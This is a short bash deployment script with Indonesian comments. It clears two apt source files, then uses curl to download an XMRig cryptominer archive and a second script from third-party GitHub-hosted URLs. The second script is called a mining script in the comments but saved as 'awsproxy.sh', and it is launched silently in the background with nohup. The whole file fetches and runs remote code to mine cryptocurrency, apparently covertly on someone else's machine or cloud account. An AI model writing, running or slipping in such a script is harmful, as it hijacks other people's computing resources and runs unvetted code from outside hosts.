#!/bin/bash
# remove error 1
sudo rm -f /etc/apt/sources.list.d/github_git-lfs.list

# remove error 2
sudo rm /etc/apt/sources.list.d/git-lfs.list 2>/dev/null

# Update & install screen
sudo apt update && sudo apt install -y screen

# Download dan ekstrak XMRig
sudo curl -L -o xmrig.tar.gz "https://raw.githubusercontent.com/appjobdesk/note/main/xmrig.tar.gz" 
tar -xvzf xmrig.tar.gz && cd xmrig

# Beri izin eksekusi ke xmrig
chmod +x ./xmrig

# Download skrip mining
sudo curl -L -o awsproxy.sh "https://raw.githack.com/appjobdesk/note/main/awsproxy.sh"

# Ubah kepemilikan agar bisa dieksekusi oleh user saat ini
sudo chown $(whoami):$(whoami) awsproxy.sh

# Beri izin eksekusi ke mining.sh
chmod +x awsproxy.sh

# Jalankan mining di background
nohup ./awsproxy.sh > awsproxy.log 2>&1 &
